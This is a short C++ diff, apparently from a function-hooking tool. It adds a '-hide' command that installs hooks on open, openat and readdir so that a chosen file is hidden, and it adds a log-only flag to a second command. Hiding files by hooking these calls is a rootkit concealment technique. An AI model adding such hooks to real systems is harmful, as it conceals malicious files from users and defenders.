@@ -43,7 +43,23 @@ void parse_message(std::string msg)
 
     if(cmd == "-hide")
     {
+        HookPatch* hookPatch = hookController->GetHookPatch();
         safe_log("=== hide mode ===\n");
+
+        hookPatch->setHiddenFile(value);
+    
+        if(!hookPatch->install("open", HIDE_FILE)){
+            safe_log("[ERROR] Patched Unsuccessful!\n");
+            return;
+        }
+        if(!hookPatch->install("openat", HIDE_FILE)){
+            safe_log("[ERROR] Patched Unsuccessful!\n");
+            return;
+        }
+        if(!hookPatch->install("readdir", HIDE_FILE)){
+            safe_log("[ERROR] Patched Unsuccessful!\n");
+            return;
+        }
     }
     else if (cmd == "-func")
     {
@@ -51,7 +67,7 @@ void parse_message(std::string msg)
 
         safe_log("=== log mode ===\n");
 
-        if(!hookPatch->install(value)){
+        if(!hookPatch->install(value, LOG_ONLY)){
             safe_log("[ERROR] Patched Unsuccessful!\n");
             return;
         }
